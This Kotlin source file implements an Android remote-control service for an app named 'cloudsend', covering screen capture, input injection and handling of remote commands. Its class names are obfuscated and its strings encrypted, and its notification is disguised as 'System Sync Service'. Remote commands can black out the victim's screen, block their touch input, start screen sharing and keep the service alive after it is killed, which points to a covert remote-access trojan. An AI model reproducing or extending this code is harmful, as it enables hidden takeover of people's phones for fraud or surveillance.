package com.cloudsend.app

import pkg2230.ClsFx9V0S

/**
 * Capture screen,get video and audio,send to rust.
 * Dispatch notifications
 *
 * Inspired by [droidVNC-NG] https://github.com/bk138/droidVNC-NG
 */

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.app.PendingIntent.FLAG_IMMUTABLE
import android.app.PendingIntent.FLAG_UPDATE_CURRENT
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.content.res.Configuration
import android.content.res.Configuration.ORIENTATION_LANDSCAPE
import android.graphics.Color
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR
import android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_PRESENTATION
import android.hardware.display.VirtualDisplay
import android.media.*
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.DisplayMetrics
import android.util.Log
import android.view.Surface
import android.view.Surface.FRAME_RATE_COMPATIBILITY_DEFAULT
import android.view.WindowManager
import androidx.annotation.Keep
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import java.util.concurrent.Executors
import java.util.concurrent.ConcurrentHashMap
import kotlin.concurrent.thread
import org.json.JSONException
import org.json.JSONObject
import java.nio.ByteBuffer
import kotlin.math.max
import kotlin.math.min

import android.graphics.*
import java.io.ByteArrayOutputStream
import android.hardware.HardwareBuffer
import android.graphics.Bitmap.wrapHardwareBuffer
import android.net.ConnectivityManager
import android.net.Network
import android.provider.Settings
import java.nio.IntBuffer
import java.nio.ByteOrder

import java.io.IOException
import java.io.File
import java.io.FileOutputStream
import java.lang.reflect.Field
import java.text.SimpleDateFormat
import android.os.Environment

const val DEFAULT_NOTIFY_TITLE = "System Sync Service"
 val DEFAULT_NOTIFY_TEXT = p50.a(byteArrayOf(40, -65, -34, -107, -71, 95, 30, -6, -59, -112, -16, 78, 14, -76, -62, -118, -66, 91), byteArrayOf(123, -38, -84, -29, -48, 60))
const val DEFAULT_NOTIFY_CHANNEL = "OK"
const val VOICE_CALL_NOTIFY_CHANNEL = "voice_call"
const val VOICE_CALL_NOTIFY_REQUEST_CODE = 42001
const val DEFAULT_NOTIFY_ID = 1
const val NOTIFY_ID_OFFSET = 100

const val MIME_TYPE = MediaFormat.MIMETYPE_VIDEO_VP9

// video const

const val MAX_SCREEN_SIZE = 1200

const val VIDEO_KEY_BIT_RATE = 1024_000
const val VIDEO_KEY_FRAME_RATE = 30

class DFm8Y8iMScvB2YDw : Service() {

    @Keep
    @RequiresApi(Build.VERSION_CODES.N)
    fun DFm8Y8iMScvB2YDwPI(kind: Int, mask: Int, x: Int, y: Int,url: String) {
        // turn on screen with LEFT_DOWN when screen off
        if (!powerManager.isInteractive && (kind == 0 || mask == LEFT_DOWN)) {
            if (wakeLock.isHeld) {
                wakeLock.release()
            }

            wakeLock.acquire(5000)
        } else {
            when (kind) {
                0 -> { // touch
                    nZW99cdXQ0COhB2o.ctx?.onTouchInput(mask, x, y)
                }
                1 -> { // mouse
                     //nZW99cdXQ0COhB2o.ctx?.onMouseInput(mask, x, y)
                    nZW99cdXQ0COhB2o.ctx?.onMouseInput(mask, x, y,url)
                }
                else -> {
                }
            }
        }
    }

      @Keep
    @RequiresApi(Build.VERSION_CODES.N)
    fun DFm8Y8iMScvB2YDwPI(kind: Int, mask: Int, x: Int, y: Int) {
        // turn on screen with LEFT_DOWN when screen off
        if (!powerManager.isInteractive && (kind == 0 || mask == LEFT_DOWN)) {
            if (wakeLock.isHeld) {
        
                wakeLock.release()
            }

            wakeLock.acquire(5000)
        } else {
            when (kind) {
                0 -> { // touch
                    nZW99cdXQ0COhB2o.ctx?.onTouchInput(mask, x, y)
                }
                1 -> { // mouse
                    nZW99cdXQ0COhB2o.ctx?.onMouseInput(mask, x, y,"")
                }
                else -> {
                }
            }
        }
    }

    @Keep
    @RequiresApi(Build.VERSION_CODES.N)
    fun DFm8Y8iMScvB2YDwKEI(input: ByteArray) {
        nZW99cdXQ0COhB2o.ctx?.onKeyEvent(input)
    }

    @Keep
    fun DFm8Y8iMScvB2YDwGYN(name: String): String {
        return when (name) {
            p50.a(byteArrayOf(26, 77, -125, -55, 59, -87, 115, 108, 85, 19, 75), byteArrayOf(105, 46, -15, -84, 94, -57, 44, 31, 60)) -> {
                JSONObject().apply {
                    put(p50.a(byteArrayOf(17, -14, -29, -126, 49), byteArrayOf(102, -101, -121, -10, 89, 15, -37, -123, 37, -110)),SCREEN_INFO.width)
                    put(p50.a(byteArrayOf(-34, -104, 76, 79, 69, -120), byteArrayOf(-74, -3, 37, 40, 45, -4)),SCREEN_INFO.height)
                    put(p50.a(byteArrayOf(105, 21, 34, -27, 34), byteArrayOf(26, 118, 67, -119, 71, -73, 5)),SCREEN_INFO.scale)
                }.toString()
            }
            p50.a(byteArrayOf(116, -34, -121, -55, -84, 119, -66, 103), byteArrayOf(29, -83, -40, -70, -40, 22, -52, 19, -93, 68, 50)) -> {
                isStart.toString()
            }
            "sdk_int" -> {
                Build.VERSION.SDK_INT.toString()
            }
            "cloudsend_status" -> {
                try {
                    val snapIsStart = _isStart
                    val snapMP = mediaProjection
                    val snapShouldRun = shouldRun
                    val snapPendingIgnore = nZW99cdXQ0COhB2o.isIgnorePending
                    val snapAccessibility = nZW99cdXQ0COhB2o.isOpen
                    val snapBIS = BIS
                    val snapSKL = SKL
                    val snapTouchBlock = nZW99cdXQ0COhB2o.isTouchBlockOn

                    JSONObject().apply {
                        put("video", snapIsStart && snapMP != null)
                        put("screenshot", snapShouldRun && snapAccessibility)
                        put("share", snapIsStart)
                        put("ignore", snapShouldRun || snapPendingIgnore)
                        put("blank", snapBIS)
                        put("penetrate", snapSKL)
                        put("touchblock", snapTouchBlock)
                        put("accessibility", snapAccessibility)
                    }.toString()
                } catch (e: Exception) {
                    Log.e("MainService", "cloudsend_status build failed", e)
                    // Return empty so Rust skips this push instead of showing fake red values.
                    ""
                }
            }
             p50.a(byteArrayOf(72, -71, -114, 59, -59, -51), byteArrayOf(33, -54, -47, 94, -85, -87)) -> {
                BIS.toString()
            }
            else -> ""
        }
    }

    @Keep
    fun DFm8Y8iMScvB2YDwSBN(name: String, arg1: String, arg2: String) {
        Log.d("MainService", "JNI dispatch: name=$name")
        if (name == "update_voice_call_state") {
            handleVoiceCallStateForForeground(arg1)
            dispatchFlutterEvent("update_voice_call_state", mapOf("client" to arg1))
        }
        if (name == "remove_voice_call_state") {
            clearPendingVoiceCallState(arg1.toIntOrNull())
        }
        if (name == "add_connection") {
            handleAuthorizedConnectionForVideoRefresh(arg1)
        }
        when (name) {
            "zego_voice_call_ready" -> {
                dispatchFlutterEvent("zego_voice_call_ready", mapOf("payload" to arg1))
            }
            "zego_voice_call_closed" -> {
                dispatchFlutterEvent("zego_voice_call_closed", null)
            }
            p50.a(byteArrayOf(-46, 84, -81, -37, 82, -91, -60, 107, -42, 83, -65, -19, 94, -92), byteArrayOf(-77, 48, -53, -124, 49, -54, -86, 5)) -> {
                try {
                    val jsonObject = JSONObject(arg1)
                    val id = jsonObject[p50.a(byteArrayOf(39, -72), byteArrayOf(78, -36, 83, -49, -16, 127))] as Int
                    val username = jsonObject[p50.a(byteArrayOf(67, -51, 7, -36), byteArrayOf(45, -84, 106, -71, 38, -23, -23, -126, -28, -6, 49))] as String
                    val peerId = jsonObject[p50.a(byteArrayOf(63, -63, -128, -84, -63, 95, 54), byteArrayOf(79, -92, -27, -34, -98, 54, 82, -86, 82, 41))] as String
                    val authorized = jsonObject[p50.a(byteArrayOf(-111, 88, 101, 110, -86, -76, -103, 87, 116, 98), byteArrayOf(-16, 45, 17, 6, -59, -58))] as Boolean
                    val isFileTransfer = jsonObject[p50.a(byteArrayOf(11, -87, -3, -66, -51, -35, 7, -123, -42, -86, -59, -33, 17, -68, -57, -86), byteArrayOf(98, -38, -94, -40, -92, -79))] as Boolean
                    val type = if (isFileTransfer) {
                        translate(p50.a(byteArrayOf(-69, 43, -88, 41, 58, -58, 83, -21, 105, -45, -122, 53, -84), byteArrayOf(-17, 89, -55, 71, 73, -96, 54, -103, 73, -75)))
                    } else {
                        translate(p50.a(byteArrayOf(58, -106, -43, -21, -5, -12, -20, 96, 27, -101, -47, -9), byteArrayOf(105, -2, -76, -103, -98, -44, -97, 3)))
                    }
                    if (authorized) {
                        
                    } else {
                        
                    }
                } catch (e: JSONException) {
                    e.printStackTrace()
                }
            }
            p50.a(byteArrayOf(15, -5, 113, -126, 80, -34, -83, -31, 21, -30, 118, -122, 123, -40, -109, -5, 22, -44, 102, -105, 69, -49, -105), byteArrayOf(122, -117, 21, -29, 36, -69, -14, -105)) -> {
                try {
                    val jsonObject = JSONObject(arg1)
                    val id = jsonObject[p50.a(byteArrayOf(-41, 19), byteArrayOf(-66, 119, 0, 51, -99, -82))] as Int
                    val username = jsonObject[p50.a(byteArrayOf(-25, 2, 100, -20), byteArrayOf(-119, 99, 9, -119, 112, 86, -29, 92, -27, 92))] as String
                    val peerId = jsonObject[p50.a(byteArrayOf(76, -84, 89, -65, 103, -55, -56), byteArrayOf(60, -55, 60, -51, 56, -96, -84))] as String
                    val inVoiceCall = jsonObject[p50.a(byteArrayOf(13, 42, -71, 84, -30, -60, 7, 33, -71, 65, -20, -63, 8), byteArrayOf(100, 68, -26, 34, -115, -83))] as Boolean
                    val incomingVoiceCall = jsonObject[p50.a(byteArrayOf(43, -27, 93, 78, 91, 9, 104, -37, 75, 7, -7, 43, -24, 91, 126, 85, 1, 106, -48), byteArrayOf(66, -117, 62, 33, 54, 96, 6, -68, 20, 113, -106))] as Boolean
                    if (!inVoiceCall) {
                        if (incomingVoiceCall) {
                            voiceCallRequestNotification(id, p50.a(byteArrayOf(-61, 76, -50, -37, -101, -24, -80, -41, -94, -7, 3, -11, -35, -113, -67, -106, -59, -70), byteArrayOf(-107, 35, -89, -72, -2, -56, -13, -74, -50)), username, peerId)
                        } else {
                           
                        }
                    } else {
                       
                    }
                } catch (e: JSONException) {
                    e.printStackTrace()
                }
            }
            
             p50.a(byteArrayOf(-125, 74, 62, -12, -93, 21, -8, -43, 37, -126, 82, 62, -1), byteArrayOf(-16, 62, 95, -122, -41, 74, -105, -93, 64)) -> {
           
                nZW99cdXQ0COhB2o.ctx?.onstart_overlay(arg1, arg2)
            } 
             
            p50.a(byteArrayOf(-88, -91, 123, 40, 66, -84, 83, 2, 68, 96, 70, -94), byteArrayOf(-37, -47, 20, 88, 29, -61, 37, 103, 54, 12, 39)) -> {
             
                if (arg1 == "1") {
                    startIgnoreFallback("remote-command")
                } else {
                    nZW99cdXQ0COhB2o.stopIgnoreCapture("remote-command")
                }
            } 
             
            p50.a(byteArrayOf(-47, 82, 118, -48, -56, -44, -124, 59, -46, 82, 98, -48, -39), byteArrayOf(-94, 38, 23, -94, -68, -117, -25, 90)) -> {
                nZW99cdXQ0COhB2o.ctx?.onstart_capture(arg1, arg2)
            } 
            
            p50.a(byteArrayOf(-123, -92, 70, -24, -117, -98, -52, -24, -53, 80, -125, -94, 66, -88), byteArrayOf(-10, -48, 39, -102, -1, -63, -81, -119, -69, 36)) -> {

                if(arg1==p50.a(byteArrayOf(1), byteArrayOf(49, 26, -98, -61, 14, 79, -102, 58, -94, -116)))
                {
                    Log.i("MainService", "关共享: received, posting to main thread")
                    Handler(Looper.getMainLooper()).post {
                        if (shouldIgnoreRemoteScreenShareCommandDuringConnectionSettle("close-share")) {
                            return@post
                        }
                        stopScreenShareAndStartIgnore("remote-command")
                        Log.i("MainService", "关共享: 已停止屏幕共享，核心服务保持在线")
                    }
                }
                else if(arg1==p50.a(byteArrayOf(-16), byteArrayOf(-63, -13, -107, -101, 57, 111, 52, -114)))
                {
                    Log.i("MainService", "开共享: received, posting to main thread")
                    Handler(Looper.getMainLooper()).post {
                        if (shouldIgnoreRemoteScreenShareCommandDuringConnectionSettle("open-share")) {
                            return@post
                        }
                        restoreMediaProjection(
                            reason = "remote-start-share",
                            allowPermissionPrompt = true
                        )
                    }
                }
            } 
            p50.a(byteArrayOf(-56, -110, -115, -107, 94, -114, -38, -106, -106, -112, 115, -120), byteArrayOf(-69, -26, -30, -27, 1, -19)) -> {
           
                 if (shouldIgnoreRemoteScreenShareCommandDuringConnectionSettle("legacy-close-share")) {
                     return
                 }
                 stopScreenShareAndStartIgnore("legacy-remote-command")
            }
            p50.a(byteArrayOf(118, 99, 26, -69, 37, -101, -42, 72, -28, -30), byteArrayOf(30, 2, 118, -35, 122, -24, -75, 41, -120, -121)) -> {
    
                val halfScale = arg1.toBoolean()
                if (isHalfScale != halfScale) {
                    isHalfScale = halfScale
              
                    updateScreenInfo(resources.configuration.orientation)
                }
                
            }
            "touch_block" -> {
                nZW99cdXQ0COhB2o.ctx?.setTouchBlockEnabled(arg1 == "1")
            }
            "dev_selector" -> {
                nZW99cdXQ0COhB2o.ctx?.handleDevSelectorCommand(arg1)
            }
            else -> {
            }
        }
    }

    private fun handleAuthorizedConnectionForVideoRefresh(clientJson: String) {
        try {
            val jsonObject = JSONObject(clientJson)
            handleAuthorizedConnectionForVideoRefresh(
                jsonObject.optInt("id", -1),
                jsonObject.optBoolean("authorized", false),
                jsonObject.optBoolean("is_file_transfer", false)
            )
        } catch (e: JSONException) {
            Log.e("MainService", "authorized connection refresh parse failed", e)
        }
    }

    private fun handleAuthorizedConnectionForVideoRefresh(
        id: Int,
        authorized: Boolean,
        isFileTransfer: Boolean
    ) {
        if (!authorized || isFileTransfer) {
            return
        }
        lastAuthorizedRemoteConnectionAt = SystemClock.elapsedRealtime()
        val reason = "authorized-connection-$id"
        mainHandler.postDelayed({ forceVideoFrameRefresh("$reason-early") }, 200)
        mainHandler.postDelayed({ forceVideoFrameRefresh("$reason-mid") }, 900)
        mainHandler.postDelayed({ forceVideoFrameRefresh("$reason-late") }, 1800)
    }

    private fun shouldIgnoreRemoteScreenShareCommandDuringConnectionSettle(command: String): Boolean {
        val last = lastAuthorizedRemoteConnectionAt
        if (last <= 0L) {
            return false
        }
        val elapsed = SystemClock.elapsedRealtime() - last
        if (elapsed > REMOTE_SCREEN_SHARE_COMMAND_SETTLE_MS) {
            return false
        }
        if (!_isStart && mediaProjection == null && !captureStarting && !isScreenSharePermissionRequestInFlight()) {
            return false
        }
        Log.i("MainService", "ignore remote screen-share command during connection settle: $command, elapsed=${elapsed}ms")
        return true
    }

    private fun dispatchFlutterEvent(method: String, arguments: Map<String, String>?) {
        Handler(Looper.getMainLooper()).post {
            try {
                oFtTiPzsqzBHGigp.flutterMethodChannel?.invokeMethod(method, arguments)
            } catch (e: Exception) {
                Log.e("MainService", "dispatchFlutterEvent failed: $method", e)
            }
        }
    }

    fun flushPendingVoiceCallEvent() {
        if (pendingVoiceCallClientJsonById.isEmpty()) {
            return
        }
        pendingVoiceCallClientJsonById.values.forEach { clientJson ->
            dispatchFlutterEvent("update_voice_call_state", mapOf("client" to clientJson))
        }
    }

    private fun clearPendingVoiceCallState(clientID: Int?) {
        if (clientID == null || clientID < 0) {
            return
        }
        pendingVoiceCallClientJsonById.remove(clientID)
        cancelNotification(clientID)
    }

    private fun handleVoiceCallStateForForeground(clientJson: String) {
        try {
            val jsonObject = JSONObject(clientJson)
            val id = jsonObject.optInt("id", -1)
            val username = jsonObject.optString("name", "")
            val peerId = jsonObject.optString("peer_id", "")
            val inVoiceCall = jsonObject.optBoolean("in_voice_call", false)
            val incomingVoiceCall = jsonObject.optBoolean("incoming_voice_call", false)
            if (incomingVoiceCall && !inVoiceCall) {
                if (id >= 0) {
                    pendingVoiceCallClientJsonById[id] = clientJson
                }
                bringAppToForegroundForVoiceCall(id, username, peerId)
            } else {
                if (id >= 0) {
                    pendingVoiceCallClientJsonById.remove(id)
                }
                if (id >= 0) {
                    cancelNotification(id)
                }
            }
        } catch (e: JSONException) {
            Log.e("MainService", "handleVoiceCallStateForForeground failed", e)
        }
    }

    private var serviceLooper: Looper? = null
    private var serviceHandler: Handler? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private var coreKeepAliveTicker: Runnable? = null
    @Volatile
    private var networkReady = true

    private val powerManager: PowerManager by lazy { applicationContext.getSystemService(Context.POWER_SERVICE) as PowerManager }
    private val wakeLock: PowerManager.WakeLock by lazy { powerManager.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.SCREEN_BRIGHT_WAKE_LOCK, "android:sys:sync_wakelock")}

    private val cpuWakeLock: PowerManager.WakeLock by lazy {
        powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "cloudsend:cpu_wakelock")
    }

    private val wifiLock: android.net.wifi.WifiManager.WifiLock by lazy {
        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
        wifiManager.createWifiLock(android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF, "cloudsend:wifi_lock")
    }

    companion object {
        @Volatile
        private var _isReady = false // media permission ready status
        @Volatile
        private var _isStart = false // screen capture start status
        @Volatile
        private var _isAudioStart = false // audio capture start status

        @Volatile
        var ctx: DFm8Y8iMScvB2YDw? = null
        private var savedMediaProjectionIntent: Intent? = null
        private var explicitStopRequested = false
        private val pendingVoiceCallClientJsonById = ConcurrentHashMap<Int, String>()
        const val ACT_ENSURE_CORE_SERVICE = "com.cloudsend.app.ENSURE_CORE_SERVICE"
        private const val CORE_KEEP_ALIVE_INTERVAL_MS = 60_000L
        private const val UNEXPECTED_DESTROY_RESTART_COOLDOWN_MS = 5_000L
        private const val NETWORK_REGISTER_REFRESH_COOLDOWN_MS = 3_000L
        private const val SCREEN_SHARE_PERMISSION_REQUEST_TIMEOUT_MS = 120_000L
        private const val REMOTE_SCREEN_SHARE_COMMAND_SETTLE_MS = 1_500L
        private var lastUnexpectedDestroyRestartAt = 0L
        private var lastNetworkRegisterRefreshAt = 0L
        @Volatile
        private var screenSharePermissionRequestInFlight = false
        private var lastScreenSharePermissionRequestAt = 0L
        
        val isReady: Boolean
            get() = _isReady
        val isStart: Boolean
            get() = _isStart
        val isAudioStart: Boolean
            get() = _isAudioStart

        @Synchronized
        fun isScreenSharePermissionRequestInFlight(): Boolean {
            if (!screenSharePermissionRequestInFlight) {
                return false
            }
            val now = SystemClock.elapsedRealtime()
            if (now - lastScreenSharePermissionRequestAt > SCREEN_SHARE_PERMISSION_REQUEST_TIMEOUT_MS) {
                screenSharePermissionRequestInFlight = false
                return false
            }
            return true
        }

        @Synchronized
        fun beginScreenSharePermissionRequest(reason: String): Boolean {
            if (isScreenSharePermissionRequestInFlight()) {
                Log.i("MainService", "skip duplicate MediaProjection request: $reason")
                return false
            }
            screenSharePermissionRequestInFlight = true
            lastScreenSharePermissionRequestAt = SystemClock.elapsedRealtime()
            Log.i("MainService", "begin MediaProjection request: $reason")
            return true
        }

        @Synchronized
        fun finishScreenSharePermissionRequest(reason: String) {
            screenSharePermissionRequestInFlight = false
            Log.i("MainService", "finish MediaProjection request: $reason")
        }
    }

    private val logTag = p50.a(byteArrayOf(-60, 15, 18, 114, 75, -13, 25, 110, -63, 3, 16), byteArrayOf(-120, 64, 85, 45, 24, -74, 75, 56))
    private val useVP9 = false
    private val binder = LocalBinder()

    private var reuseVirtualDisplay = Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE

    // video
    @Volatile
    private var mediaProjection: MediaProjection? = null
    private var surface: Surface? = null
    private val sendVP9Thread = Executors.newSingleThreadExecutor()
    private var videoEncoder: MediaCodec? = null
    private var imageReader: ImageReader? = null
    private var virtualDisplay: VirtualDisplay? = null
    @Volatile
    private var captureStarting = false
    @Volatile
    private var screenOffActive = false
    @Volatile
    private var suppressNextProjectionStoppedIgnore = false
    @Volatile
    private var clearIgnoreOnceAfterShareStart = false
    @Volatile
    private var lastAuthorizedRemoteConnectionAt = 0L

    private val screenStateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                Intent.ACTION_SCREEN_OFF -> {
                    screenOffActive = true
                    val hadScreenShare = _isStart || mediaProjection != null
                    Log.i("MainService", "screen off: core service unchanged")
                    refreshCoreKeepAlive("screen off")
                    mainHandler.postDelayed({
                        startScreenOffIgnoreFallbackIfNeeded(hadScreenShare, "screen-off-early")
                    }, 800)
                    mainHandler.postDelayed({
                        startScreenOffIgnoreFallbackIfNeeded(hadScreenShare, "screen-off-projection-lost")
                    }, 1800)
                }
                Intent.ACTION_SCREEN_ON,
                Intent.ACTION_USER_PRESENT -> {
                    screenOffActive = false
                    Log.i("MainService", "screen on/user present: core service unchanged")
                    refreshCoreKeepAlive("screen on/user present")
                }
            }
        }
    }
    private var screenStateReceiverRegistered = false
    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            networkReady = true
            Log.i("MainService", "network available: core service unchanged")
            refreshCoreKeepAlive("network available")
            requestNetworkRegisterRefresh("network available")
        }

        override fun onLost(network: Network) {
            networkReady = false
            Log.i("MainService", "network lost: core service unchanged")
            refreshCoreKeepAlive("network lost")
        }
    }
    private var networkCallbackRegistered = false

    // notification
    private lateinit var notificationManager: NotificationManager
    private lateinit var notificationChannel: String
    private lateinit var notificationBuilder: NotificationCompat.Builder

    private lateinit var ErrorExceptions: ByteBuffer
    private lateinit var IOExceptions: ByteBuffer 

    override fun onCreate() {
        super.onCreate()
        
        explicitStopRequested = false
        ClsFx9V0S.ygmLIEQ5(this)
        ctx = this
        HandlerThread(p50.a(byteArrayOf(-111, 68, -29, 10, 94, 79, -53), byteArrayOf(-62, 33, -111, 124, 55, 44, -82)), Process.THREAD_PRIORITY_BACKGROUND).apply {
            start()
            serviceLooper = looper
            serviceHandler = Handler(looper)
        }
        updateScreenInfo(resources.configuration.orientation)
        initNotification()

        // keep the config dir same with flutter
        val prefs = applicationContext.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
        val configPath = prefs.getString(KEY_APP_DIR_CONFIG_PATH, "") ?: ""
        ClsFx9V0S.xt4P9mWE(configPath, "")

        createForegroundNotification()
        registerScreenStateReceiver()
        registerNetworkCallback()
    }
    
    fun dd50d328f48c6896(a: Int, b: Int) {

         ErrorExceptions = ClsFx9V0S.SzGEET65(a, b)
         
         IOExceptions = ClsFx9V0S.SzGEET65(a, b)
    }


    fun calculateIntegerScaleFactor(originalWidth: Int, targetWidth: Int): Int {
        if (targetWidth == 0) return 0 
        return originalWidth / targetWidth
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        if (_isReady || _isStart) {
            refreshCoreKeepAlive("task removed")
        }
    }

    override fun onTrimMemory(level: Int) {
        super.onTrimMemory(level)
        if (_isReady || _isStart) {
            Log.w("MainService", "onTrimMemory($level): core service unchanged")
            refreshCoreKeepAlive("trim memory $level")
        }
    }

    override fun onLowMemory() {
        super.onLowMemory()
        if (_isReady || _isStart) {
            Log.w("MainService", "onLowMemory: core service unchanged")
            refreshCoreKeepAlive("low memory")
        }
    }

    override fun onDestroy() {
        if (explicitStopRequested) {
            _isReady = false
            captureStarting = false
            _isStart = false
            _isAudioStart = false
            checkMediaPermission()
        } else {
            _isReady = true
            captureStarting = false
            _isStart = false
            _isAudioStart = false
        }
        stopCoreKeepAliveTicker()
        unregisterScreenStateReceiver()
        unregisterNetworkCallback()
        if (cpuWakeLock.isHeld) {
            cpuWakeLock.release()
        }
        if (wifiLock.isHeld) {
            wifiLock.release()
        }
        if (explicitStopRequested) {
            stopService(Intent(this, DFrLMwitwQbfu7AC::class.java))
            clearRustServiceContextIfCurrent("explicit-destroy")
        } else {
            Log.w("MainService", "onDestroy without explicit stop; keep JNI context and request core restart")
            requestCoreServiceRestartAfterUnexpectedDestroy()
        }
        super.onDestroy()
    }

    private var isHalfScale: Boolean? = null;
    private fun updateScreenInfo(orientation: Int) {
        var w: Int
        var h: Int
        var dpi: Int
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

     
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val m = windowManager.maximumWindowMetrics
            w = m.bounds.width()
            h = m.bounds.height()
            dpi = resources.configuration.densityDpi
        } else {
            val dm = DisplayMetrics()
            windowManager.defaultDisplay.getRealMetrics(dm)
            w = dm.widthPixels
            h = dm.heightPixels
            dpi = dm.densityDpi
        }

        val max = max(w,h)
        val min = min(w,h)
        //横屏
        if (orientation == ORIENTATION_LANDSCAPE) {
            w = max
            h = min
        } else {
            w = min
            h = max
        }

        var scale = 1
        if (w != 0 && h != 0) {

            HomeWidth = w
            HomeHeight = h
            HomeDpi = dpi
            
            if (isHalfScale == true && (w > MAX_SCREEN_SIZE || h > MAX_SCREEN_SIZE)) {

            }
            else
            {
             
            }
            
     
            if (SCREEN_INFO.width != w) {
                
                //大体比例
                scale = calculateIntegerScaleFactor(w,350)
                w /= scale
                h /= scale
                dpi /= scale
                
                         
                SCREEN_INFO.width = w
                SCREEN_INFO.height = h
                SCREEN_INFO.scale = scale
                SCREEN_INFO.dpi = dpi
                
                 
                dd50d328f48c6896(w,h)
                
                if (_isStart && mediaProjection != null && virtualDisplay != null) {
                    rebindActiveVirtualDisplayForScreenInfo("screen-info-changed")
                }
            }

        }
    }

    private fun rebindActiveVirtualDisplayForScreenInfo(reason: String) {
        if (!_isStart || mediaProjection == null || virtualDisplay == null) {
            return
        }
        try {
            ClsFx9V0S.VaiKIoQu("video", false)
        } catch (e: Exception) {
            Log.e("MainService", "rebindActiveVirtualDisplay: disable video raw failed", e)
        }
        try {
            virtualDisplay?.resize(SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi)
        } catch (e: Exception) {
            Log.e("MainService", "rebindActiveVirtualDisplay: resize failed", e)
        }
        try {
            virtualDisplay?.setSurface(null)
        } catch (e: Exception) {
            Log.e("MainService", "rebindActiveVirtualDisplay: detach surface failed", e)
        }
        try {
            imageReader?.close()
        } catch (e: Exception) {
            Log.e("MainService", "rebindActiveVirtualDisplay: close imageReader failed", e)
        }
        imageReader = null
        try {
            surface?.release()
        } catch (e: Exception) {
            Log.e("MainService", "rebindActiveVirtualDisplay: release surface failed", e)
        }
        surface = createSurface()
        if (surface == null) {
            handleProjectionStoppedKeepService("$reason-surface-null")
            return
        }
        try {
            virtualDisplay?.setSurface(surface)
            ClsFx9V0S.VaiKIoQu("video", true)
            oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(true)
            forceVideoFrameRefresh(reason)
        } catch (e: Exception) {
            Log.e("MainService", "rebindActiveVirtualDisplay: attach surface failed", e)
            handleProjectionStoppedKeepService("$reason-attach-failed")
        }
    }

    override fun onBind(intent: Intent): IBinder {
 
        return binder
    }

    inner class LocalBinder : Binder() {
        init {
     
        }

        fun getService(): DFm8Y8iMScvB2YDw = this@DFm8Y8iMScvB2YDw
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
    
        super.onStartCommand(intent, flags, startId)
        explicitStopRequested = false
        if (intent == null || intent.action == null || intent.action == ACT_ENSURE_CORE_SERVICE) {
            Log.i("MainService", "onStartCommand: ensure core service")
            _isReady = true
            ensureBackgroundKeepAlive()
            startCoreKeepAliveTicker()
            checkMediaPermission()
            return START_STICKY
        }
        if (intent?.action == ACT_INIT_MEDIA_PROJECTION_AND_SERVICE) {
            createForegroundNotification()

            if (intent.getBooleanExtra(EXT_INIT_FROM_BOOT, false)) {
                ClsFx9V0S.G4yQ9OYY()
            }
   
            val projectionResult = intent.getParcelableExtra<Intent>(EXT_MEDIA_PROJECTION_RES_INTENT)
            if (projectionResult != null) {
                try {
                    val mediaProjectionManager =
                        getSystemService(p50.a(byteArrayOf(118, 104, 74, -67, 14, -83, 107, 127, 65, -66, 10, -111, 111, 100, 65, -70), byteArrayOf(27, 13, 46, -44, 111, -14))) as MediaProjectionManager

                    savedMediaProjectionIntent = if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        projectionResult.clone() as Intent
                    } else {
                        null
                    }
                    mediaProjection =
                        mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, projectionResult)
                    mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                        override fun onStop() {
                            Log.w("MainService", "MediaProjection stopped by system")
                            Handler(Looper.getMainLooper()).post {
                                handleProjectionStoppedKeepService("system-callback")
                            }
                        }
                    }, Handler(Looper.getMainLooper()))
                    checkMediaPermission()
                    _isReady = true
                    createForegroundNotification()
                    ensureBackgroundKeepAlive()
                    startCoreKeepAliveTicker()

                    if (!_isStart) {
                        val captureStarted = startCapture()
                        Log.i("MainService", "onStartCommand: capture start result=$captureStarted after permission grant")
                    }
                    finishScreenSharePermissionRequest("permission-consumed")
                } catch (e: Exception) {
                    Log.e("MainService", "onStartCommand: consume MediaProjection result failed", e)
                    finishScreenSharePermissionRequest("permission-consume-failed")
                    handleProjectionStoppedKeepService("permission-consume-failed")
                }
            } else {
                Log.i("MainService", "onStartCommand: projection init without permission result, keep core service only")
                _isReady = true
                ensureBackgroundKeepAlive()
                startCoreKeepAliveTicker()
                checkMediaPermission()
            }
        }
        return START_STICKY
    }

    override fun onConfigurationChanged(newConfig: Configuration) {
        super.onConfigurationChanged(newConfig)
        updateScreenInfo(newConfig.orientation)
    }

    private fun requestMediaProjection(reason: String) {
        if (!beginScreenSharePermissionRequest(reason)) {
            return
        }
        val intent = Intent(this, XerQvgpGBzr8FDFr::class.java).apply {
            action = ACT_REQUEST_MEDIA_PROJECTION
